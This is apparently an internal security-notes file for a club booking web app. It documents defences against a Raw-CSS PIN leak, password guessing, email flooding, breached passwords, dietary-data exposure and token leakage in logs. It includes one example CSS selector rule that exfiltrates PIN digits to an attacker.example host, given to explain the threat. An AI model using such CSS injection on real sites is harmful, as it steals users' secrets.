# Security Notes

This document captures security decisions and trade-offs that are too
implementation-specific for `SECURITY.md` at the repository root. The
root `SECURITY.md` covers the public reporting policy; this file
captures internal mitigations and operator-facing rationale.

## Secret entry on pages that carry Raw CSS

Audience: Developer, Agent.

### The rule

**A user-entered secret on a surface that injects administrator Raw CSS must
never be represented in a CSS-selectable DOM attribute, or in any other
selector-readable DOM metadata, while the secret is live.** The element's `value`
*property* may hold what the browser needs in order to submit; a stylesheet
selector must not be able to recover it.

Use `SecretInput` (`src/components/ui/secret-input.tsx`) for such a field. Do not
solve it by filtering CSS selectors, and do not move the secret to `data-*`,
`aria-*`, a hidden field or `title` — those are selectable too.

### Context

`buildClubThemeCss()` is the only build that appends the club's `rawCss` from
Admin > Site Appearance, and its output reaches a page document in **three**
places, enumerated in
[`SECURITY-ATTACK-SURFACE.md`](SECURITY-ATTACK-SURFACE.md) → "Admin Raw CSS on
the public site": the website chrome (the `(website)` and `(website-dynamic)`
groups), the lodge display screen, and the pre-setup holding screen. Every other
shell injects `buildClubThemeAppCss()`, which excludes it by design. That bullet
is the count; do not restate it here or anywhere else.

A styling administrator is deliberately **outside** the trust boundary of a kiosk
PIN or a bearer token — the same boundary #2827 drew for the group-join payment
token.

React's controlled-input pattern breaks that boundary. On every update
`react-dom` writes `node.defaultValue`, and `defaultValue` reflects to the `value`
**content attribute** — so a controlled input publishes what the visitor has typed
to any selector on the page:

```css
input#hut-leader-pin[value^="14"] { background: url(https://attacker.example/14); }
```

Measured in real browsers before any fix was written, because jsdom is not
evidence about a browser. The per-engine matrix is in the attack-surface bullet
above; the full method and the raw observations are on issue #2981.

### Mitigation

`SecretInput` renders an **uncontrolled** input: neither `value` nor
`defaultValue` reaches the element, so `react-dom` never writes `defaultValue`
and no `value` attribute exists at any point. Both props are removed by the type,
so passing one is a compile error rather than a lint rule, and stripped at
runtime so an untyped spread cannot reinstate the leak. Input filtering runs
against the element's own property instead of being fed back as a prop.

### The kiosk PIN is masked, with a show toggle (#3460)

Owner decision, 14 Sep 2026. The hut-leader kiosk PIN field is
`type="password"` by default, so the digits are dots on screen: that removes
shoulder-surfing and leaves no glyph of the PIN's digits for an administrator's
`@font-face` ligature technique to measure (the mask dots reveal only the fixed
length). A **Show PIN** button (its label flips to **Hide PIN**, keyboard
operable, keeps focus in the field on a click, and `type="button"` so it never
submits) flips the same element to `type="text"`. Rendered glyphs therefore exist **only while the PIN is shown**,
which is the cost the owner accepted for letting a hut leader check a mistyped
digit. The #2981 rule holds in both states: the element still carries no `value`
attribute. The behaviour belongs to `SecretInput` (`revealable`), so any future
secret field gets it from the one primitive.

### What keeps it true

- `e2e/raw-css-secret-reflection.spec.ts` — the runtime pin. It saves real Raw
  CSS containing the oracle rules, types a known PIN into the real page, and
  fails if the attribute, a prefix selector or the computed style ever reveals a
  character, and asserts the field is `password` by default and `text` only
  while shown. This half cannot be replaced by a source scan.
- `src/lib/__tests__/raw-css-secret-input-census.test.ts` — the static half:
  which files inject the theme CSS (so a fourth sink cannot appear
  unclassified), which credential fields exist on those surfaces, and that
  `SecretInput` still passes no value into the DOM. Its own docblock names the
  four evasion shapes it cannot see.
- `src/components/ui/__tests__/secret-input.test.tsx` — filtering, caret
  repair and the show/hide toggle.

### Scope, and what is accepted

Bounded to credential-bearing fields — PIN/passcode, passwords, bearer/invite/
access tokens, API keys — on the Raw-CSS surfaces. Ordinary text fields (a name,
an email) are not in scope: they are not secrets the styling administrator sits
outside the boundary for, and the attendee-data residual the attack-surface
bullet records is the owner's ratified position on those.

A stylesheet can still observe these, and all of them are **accepted**. None is
character-wise, and for a fixed-length all-digit PIN none of them narrows the
search space at all:

- `:placeholder-shown` — whether the field is empty.
- `:valid` / `:invalid` — whether the value satisfies the field's `pattern`,
  i.e. whether six digits have been entered.
- the submit button's `disabled` attribute, which flips at the same moment and is
  therefore redundant with `:valid`.
- `:autofill` — whether a password manager filled it.
- `:focus` / `:focus-visible` — whether the visitor is in the field.
- `:user-invalid` — the same bit as `:invalid`, after interaction.

**Stated limit, not a residual: real password-manager autofill was not measured.**
The browser spec covers programmatic paste and keyboard entry. HTML autofill sets
the `value` property rather than the attribute, which is the same seam typing
uses, so it is reasoned rather than observed.

## Personal-data retention and Sentry Replay

Audience: Operator, Developer, Adopter.

The [personal-data retention schedule](PRIVACY_RETENTION.md) covers every
Prisma model that holds personal data, including indirect member links and
settings' officer attribution. The three new cleanup jobs ship OFF; review the
candidates and configured periods before enabling them in Admin → Privacy
retention (`/admin/privacy-retention`).

Sentry Replay is an explicit club opt-in and defaults OFF. Before enabling it,
the club's privacy notice must **name Sentry Replay** and explain the recording
and its purpose, including what information can leave the application for
Sentry and the applicable retention. Review the Sentry project's retention and
access settings as part of that disclosure. Ordinary error reporting and
session replay are separate decisions; enabling error reporting does not
constitute the club's Replay opt-in.

Open tabs recheck the Replay setting every minute and when they regain focus
or become visible. Saving retention settings refreshes the current tab
immediately on the process handling that save. Other processes may retain the
previous policy for up to 60 seconds; combined with minute polling, an open tab
can take up to two minutes to observe a change while visible. The public policy
endpoint is rate limited and caches only the non-personal opt-in in process.
A failed policy read stops recording once the cached policy expires; background browser timer
throttling can delay the periodic refresh until the tab becomes visible.

## Per-account password throttle (#4609)

Audience: Operator, Developer.

The per-address limiter (10 attempts per 15 minutes per internet address)
cannot see one account guessed from many addresses — a botnet, a phone
network, a cloud provider. A second count, kept per account, closes that gap.
The rules are `INV-AUTH-001` to `INV-AUTH-004` in
[`invariants/authentication.md`](invariants/authentication.md); this section
holds the threat, the behaviour and the limits.

**What a member sees.** Five unsuccessful password attempts on one account,
from any addresses, start a wait: 30 seconds, doubling after each further
attempt to 15 minutes. An hour with no attempt forgets the count. During the
wait the sign-in page says "Too many sign-in attempts for this account. Please
wait a few minutes and try again", adding "or use another way to sign in below"
when the club has emailed sign-in links or Google switched on. A correct
password after the wait signs in as before and clears the count; so does a
completed password reset.

**Changing a password (#4640).** The authenticated change-password route shares
this budget, keyed on the member's stored email. Wrong current passwords count
alongside sign-in guesses. While waiting, it returns HTTP 429 with
`LOGIN_THROTTLED` and a generic wait message, without comparing the password or
changing it. A valid current password after the wait clears the shared count,
including when the member must change their password. Session and input checks
run first; this route accepts no account identifier to guess against.

**Enumeration parity at sign-in.** The throttle answers before any member record is read,
and its answer — `LOGIN_THROTTLED`, one message — is the same for a real, an
unknown, an inactive and a deleted account, after the same dummy bcrypt
compare. Unknown emails are counted exactly as real ones, so a throttled real
account and a throttled unknown email look the same. One thing does differ: a
valid sign-in or completed reset on a real account clears its count, which an
unknown email's count never is (see the stated limits).

**Password comparison cost (#4639).** Refused sign-ins use the precomputed
`DUMMY_PASSWORD_HASH` in `src/lib/password-hashing.ts`. Every account-password
writer, including lodge accounts, placeholders and seeds, imports
`PASSWORD_BCRYPT_COST` from that module. A regression test compares the dummy
hash's encoded cost with a newly generated password hash; changing the cost
requires regenerating the dummy hash too. Existing stored passwords keep their
original cost until replaced, so their comparison time can differ from the
dummy comparison. In particular, existing cost-12 seed and lodge accounts now
compare faster than unknown accounts. Hut-leader PINs use their separate policy.

**What is stored.** `LoginThrottle` holds an HMAC-SHA256 of the lower-cased
email under `AUTH_SECRET` (domain label `login-throttle:v1:`), a count and the
time of the last counted attempt. No address is stored or logged. Rows are
deleted on a valid password or a completed reset; a row idle for an hour is
deleted by the daily `data-pruning` job, or sooner by a ten-minute sweep in a
process that is handling password sign-ins
([retention schedule](PRIVACY_RETENTION.md)).
**Rotating `AUTH_SECRET` changes every key, which resets every count.**

**Under load on one account.** A claim waits at most one second for the
account's row; a claim that cannot have it answers with the same wait message,
uncounted. An account already waiting is refused from a plain read, without
queuing for the row, so a burst of guesses on one account cannot hold the
connection pool.

**If the store fails.** The claim falls back to a bounded per-process count at
the #1142 divided budget (one free attempt, then the same doubling wait), logs
at most once a minute naming no address or key, and never refuses a sign-in
because of the failure itself.

**Stated limits.**

- **An attacker can keep re-triggering the wait.** Refused attempts cost the
  attacker nothing on the account's count, and the per-address limiter does not
  stop many addresses. Someone who knows an officer's email can send a guess
  each time the 15-minute wait ends and keep password sign-in waiting, and a
  password reset buys back only five attempts. The officer still has any other
  way in the club has switched on — emailed sign-in links (off by default) or
  Google. The owner accepted this on #4609; an exemption for known devices
  would need a new plan on #4454.
- **During a blue/green cutover the old slot has no per-account throttle.** The
  migration is expand-only and the draining release never names the table, so
  guesses routed to the old slot are counted only by the per-address limiter.
  Protection is complete once the old slot drains.
- **A recent valid sign-in shows as a reset count.** A valid password or a
  completed reset clears the count (the issue's rule, and the owner's decision
  for resets), and an unknown email's count is never cleared. So someone who
  sends four wrong guesses and, within the hour, two more can tell from whether
  the last one waits that a real account's owner signed in or reset in between
  — proving the account exists and roughly when it was used. A throttled real
  account and a throttled unknown email still look the same.
- **In-memory fallback counts per process.** While the store is down — or the
  connection pool is too busy to give a claim a connection within a second —
  each replica counts on its own, at the divided budget, without reading the
  stored count; a restart forgets them.
- Password sign-in and authenticated current-password checks only: emailed sign-in links, Google, two-factor code entry
  (its own lockout) and lodge PIN sign-in are separate, and forgot-password and
  sign-in-link requests have their own per-account limits
  ([below](#per-account-email-request-limits-4613)).

## Per-account email request limits (#4613)

Audience: Operator, Developer.

"Forgot password" and "email me a sign-in link" are each limited to 5 requests
an hour from one internet address. That cannot see one account requested from
many addresses, which could fill a member's inbox with emails they did not ask
for, paid for from the club's sending quota and reputation. A second count, per
account, closes that gap. The rule is `INV-AUTH-005` in
[`invariants/authentication.md`](invariants/authentication.md#inv-auth-005).

**What a member sees.** Each route sends at most **3 emails an hour to one
account**, however many addresses ask; the two routes count separately. The
fourth request in the hour gets the usual "check your email" answer and no
email. The window is fixed, not sliding: the count resets an hour after that
account's first counted request.

**Enumeration parity.** The limit is decided from the account key alone, before
any member record is read (and, for sign-in links, before the module setting is
read). A limited request answers HTTP 200 `{ success: true }`, byte for byte the
answer to an accepted request, a real account and an unknown email alike.
Unknown emails are counted exactly as real ones.

**What is stored.** The count lives in the shared `RateLimitCounter` table
under `forgot-password-account:account:` or `magic-link-request-account:account:`
followed by the account key the password throttle uses: an HMAC-SHA256 of the
lower-cased email under `AUTH_SECRET` (`INV-AUTH-001`). No address is stored or
logged, and rows go with the ordinary rate-limit cleanup
([retention schedule](PRIVACY_RETENTION.md)). Without an auth secret the count
stays in the process.

**If the store fails.** The count falls back to the #1142 per-process budget,
3 divided by 4 and rounded down to a floor of 1: one email per account per hour
on each replica. The routes still answer; a store failure never blocks a request.

**Stated limits.**

- **Anyone can use up a member's hourly allowance.** A sender who knows a
  member's email can request three emails each hour, after which the member's
  own request that hour sends nothing. The member still has the emails already
  sent, and the next hour's allowance. This trades a delay for the member
  against an unbounded stream to their inbox.
- **A limited request skips the database read**, so it can answer slightly
  faster than an accepted one. That timing shows only that the limit was
  reached, never whether the account exists.
- **In-memory fallback counts per process.** While the store is down, each
  replica counts on its own and a restart forgets the count.
- **During a blue/green cutover the old slot has no per-account limit.** The
  draining release never calls it, so requests routed to the old slot are
  counted only by the per-address limiter. Protection is complete once the old
  slot drains.

## Breached-password check (#4610)

Audience: Operator, Developer.

A password reused from a breached site passes any length or character rule,
and it is the first thing an attacker tries. So when a person chooses a
password, the app asks a public breached-password service whether it has been
seen in a breach, and refuses it if so. The rules are `INV-AUTH-006` in
[`invariants/authentication.md`](invariants/authentication.md#inv-auth-006); this section
holds the behaviour and the limits.

**Where it runs.** Changing a password, choosing one from a reset or
account-setup link, an officer setting a kiosk password (Lodge settings), and
the install-time seed's `SEED_ADMIN_PASSWORD` and `SEED_LODGE_PASSWORD`, each
checked just before its account is created. The seed runs before the club
setting exists, so it always checks, and a breached password stops it with a
message naming the variable.
Self-registration is retired (`/api/auth/register` answers 410), and the
other ways an account is created (admin creation, imports, approved
applications, placeholder contacts) store a random placeholder, so the
person's first real password is chosen through the reset or setup link and
screened there. A refused password answers HTTP 400
with code `PASSWORD_BREACHED` and a plain message asking for another; a reset
or setup link stays usable, so the person can try again. Sign-in never runs
the check, and passwords already set are not re-checked.

**What leaves the server.** The app makes the password's SHA-1 hash and sends
only its first five hex characters to
`https://api.pwnedpasswords.com/range/<prefix>` (the k-anonymity "range"
method), with the `Add-Padding` header so every answer is a similar size. The
service returns every listed hash suffix sharing that prefix, and the match is
made on the server. No password, full hash, email or member id is sent, and no
log line carries the prefix. Sentry instruments outgoing fetches, so the server
init configures its Node fetch integration to ignore the range request
(`ignoreOutgoingRequests`): it gets no span, no breadcrumb, and no
`sentry-trace` or `baggage` header sent to the service. As a backstop, the
shared privacy options every `Sentry.init` spreads
(`src/lib/sentry-privacy-options.ts`, keyed on the endpoint constant) drop any
span naming the range URL, scrub the prefix from any span that still reaches
`beforeSendSpan`, drop the fetch breadcrumb, and scrub it from every error
event. Deployments that restrict outbound traffic must
allow HTTPS to `api.pwnedpasswords.com`
([`CONFIGURATION.md`](../CONFIGURATION.md#outbound-network-access)).

**Club setting.** On by default. A Support & System editor can switch it off
under **Admin → Login & Security → Password policy** ("Refuse passwords found
in public data breaches"); it is saved and audited with the rest of the card
and travels in a configuration export. Switched off, no request is made.

**If the service is slow or down.** It fails open: with no answer within three
seconds, a network error, a non-200 or a malformed answer, the password is
accepted and a warning naming only the failure class is logged. An outage
elsewhere never stops a member setting a password or finishing setup.

**Every place a password is written is counted.**
`src/lib/__tests__/password-hash-writer-census.test.ts` parses every
`passwordHash` writer under `src/`, `prisma/` and `scripts/`: property writes,
and raw-SQL `INSERT` or `UPDATE` literals naming the column. A writer must
either be guarded — a `const` bound to the awaited `screenChosenPassword`
result, then an `if (!result.ok)` that returns, both in a block enclosing the
write and before it, where the screened argument and the written hash's
`bcrypt.hash` input resolve to the same unreassigned `const` or parameter, and
the call does not switch the check off — or be listed as exempt with its reason (placeholders, imports,
erasure, the local demo seed and SQL fixtures store generated or unusable
hashes). For an exempt writer the census also traces the value it writes,
through `const` bindings and the `bcrypt.hash` input, and requires random
bytes, the erased-account sentinel or a fixed literal (for raw SQL, the value
written inline: no template holes, bind placeholders or bind arguments), so an
exemption cannot come to cover a typed password; only the local demo seed is listed as
untraced. A new
writer in neither list fails the build. It cannot see SQL assembled by
concatenating separate literals or read from a `.sql` file at run time.

**Stated limits.**

- **Fail-open means an outage lets a breached password through.** That was
  chosen over blocking members (#4610); the warning in the log is how an
  operator sees it happening.
- **The prefix narrows the password to one of several hundred listed hashes.**
  That is the method's design: the service learns a bucket, not the password,
  and nothing ties the request to a member beyond the server's own address.
- **During a blue/green cutover the old slot does not check.** The migration
  only adds the setting column, and the draining release never reads it.
- **The install-time seed fails open too.** If the seed host cannot reach
  the service, `SEED_ADMIN_PASSWORD` and `SEED_LODGE_PASSWORD` are accepted
  unchecked, as any chosen password would be. The seed admin must still change
  password on first sign-in, which is screened; nothing forces the seed
  kiosk's password to change.
- **The local demo seed is not screened.** `pnpm run db:seed:demo` hashes
  `DEMO_SEED_PASSWORD` (or its published default) for local demo accounts; it
  refuses to run without `ALLOW_DEMO_SEED=1` and never seeds a production
  account.

## Dietary/allergy information (special-category data)

Audience: Developer, Agent, Operator.

`Member.dietaryRequirements` (#2941) and each stay's
`BookingGuest.dietaryRequirements` (#3029) hold health-related personal
information, children's included. The rule is `INV-PRIV-022` in
[`invariants/analytics-and-privacy.md`](invariants/analytics-and-privacy.md#inv-priv-022);
this section records how it is enforced.

- **Absent by default, not filtered.** Every application Prisma client omits the
  column (`src/lib/prisma-global-omit.ts`), so a Member read that does not ask
  for it does not carry it — including nested includes and the row an update
  returns. `src/lib/member-dietary.ts` is the only module that asks, and only for
  a caller holding a grant: the member themself (the grant takes their session),
  their own data export, an admin whose OWN database row and access roles reach
  **membership** (the grant re-reads them and ignores any session matrix), or a
  merge whose Full Admin the grant re-checks in the database, scoped to the two
  members being merged. A booking value is read by an admin whose own rows reach
  **bookings** (view; edit to change one row through
  `PATCH /api/admin/bookings/[id]/guest-dietary`), by the kiosk's `admin` and
  `hut-leader` tiers for that day's present guests only, and by the subject's
  own export for their own guest rows. A booking grant cannot read a profile,
  nor a profile grant a booking. A grant is an opaque object whose authority
  lives in a module-private map, so a copy of one is not a grant.
- **The booking write side hands out tokens, not values — and its real fence is
  its importer list.** Its half of the boundary,
  `src/lib/member-dietary-booking-writes.ts`, is the only other file that may
  name the column; it mints no grant, and its carries are scoped to their
  source booking. Its two fragment builders necessarily return the plain value
  for Prisma to write, so what holds is the census: a closed list of booking
  writers may import it, none may name a grant or reader, the builders may
  appear only as a `...` spread operand, nothing imported from it may be
  renamed, and seeding may only come from the toggle. Its carries are scoped to
  their source booking, which stops an accidental cross-booking capture, not a
  deliberate one. That is a text scan and holds no stronger than one; the
  importer list plus review is the fence. Every guest create
  site takes a required dietary decision from it, and the held-party
  planners carry a value only by unique identity, never by position
  (`INV-MOD-059`); a writer never holds the value in readable form.
- **The type does not say so.** `src/lib/prisma.ts` keeps the plain
  `PrismaClient` type, so the compiler still shows the field on every row; a read
  outside the module gets `undefined`, never the value.
  `member-dietary-access-census.test.ts` is a TEXT scan of `src/`, `scripts/`,
  `prisma/` and `e2e/`. It fails on any other select, local omit override,
  raw-SQL read of the column, whole-row raw read or omit-less client; it confines
  the field's spelling (in `src/`), imports of the module, and calls of the merge
  engine (which mints a scoped grant internally) to listed files, none on an
  egress path (a booking-value entry may be allowed, by name, onto the booking
  or kiosk family only), and refuses a re-export, exported alias or minting
  wrapper of a grant or reader, a booking writer that names a grant or reader,
  and any writer but the module naming the column. It does
  NOT trace data flow: a listed file reading the field off an ordinary row, or
  passing a value it legitimately holds onward, stays green. Review covers that.
- **Redaction as a backstop.** The log/Sentry redactor strips `dietary`/`allerg`
  keys, and the audit sanitizer redacts any string or structure under such a key
  while keeping the booleans that record which field changed.
- **The AI diagnostics role cannot read it.** Its Member and BookingGuest
  grants are column allowlists (`provision-role.ts`) that include neither
  column.
- **Backups contain it**, like every other column; see
  [`guides/backups.md`](guides/backups.md).

## Token-bearing URL paths

### Context

Some emailed confirmation and payment links carry 256-bit tokens in URL paths:

```
https://<host>/membership-cancellation/<token>
https://<host>/chores/<token>
https://<host>/nominations/<token>
https://<host>/pay/<token>
https://<host>/booking-requests/verify/<token>
```

URL paths are routinely captured by:

- Next.js / Node access logs
- Reverse-proxy logs (Caddy, in our deployment topology)
- Sentry and any other observability tooling that captures request
  metadata
- Browser history
- The `Referer` header of any outbound link click from the confirmation
  page

### Residual risk

Some token routes are also session-bound; others are intentionally public
opaque-token flows. A stolen public payment, chore, nomination, or booking
request verification token can act as the bearer credential for that specific
workflow until it is used, revoked, or expires.

### Mitigation

The shared text redaction layer (`src/lib/redact-sensitive-json.ts`)
strips the token segment from any supported token-bearing path before the
value is emitted by the Pino logger or attached to an `err` payload. This
covers structured request logs, captured error stacks, URL-encoded login
callback paths, and any other observability surface that flows through
`redactSensitiveText`.

The token remains in clear text in the email body sent to the participant or
requester, which is the only place they need it.

### Operator checklist

When reviewing observability dashboards or proxy access logs that are
exported outside of the application process, confirm that the source
also redacts these token-bearing path segments. The application-level
redaction does not protect logs that the application does not emit.
